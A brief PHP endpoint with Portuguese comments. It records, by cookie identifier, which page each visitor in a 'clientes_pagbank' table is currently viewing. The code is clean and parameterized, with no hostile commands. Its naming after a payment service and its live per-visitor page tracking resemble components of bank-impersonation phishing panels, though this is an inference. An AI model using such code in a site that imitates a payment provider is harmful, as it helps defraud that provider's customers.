<?php
// --- update_location.php ---

// Conexão com o banco (adapte para sua configuração local, se necessário)
$DATABASE_URL = getenv("DATABASE_URL");
if (!$DATABASE_URL) {
    $DATABASE_URL = "host=SEU_HOST port=5432 dbname=SEU_DB user=SEU_USER password=SEU_PASS"; // Adapte para teste local
}
$db = pg_connect($DATABASE_URL);

// Pega o valor do cookie e o nome da página enviados pelo JavaScript
$cookie_value = $_COOKIE['identificador_cliente'] ?? null;
$page_name = $_POST['page'] ?? null;

if ($db && $cookie_value && $page_name) {
    // Atualiza a coluna 'current_page' no banco de dados
    $query = "UPDATE clientes_pagbank SET current_page = $1 WHERE identificador_cookie = $2";
    pg_query_params($db, $query, [$page_name, $cookie_value]);

    // Responde com sucesso (opcional)
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
} else {
    // Responde com erro se os dados não foram enviados
    header('Content-Type: application/json');
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Dados insuficientes.']);
}
?>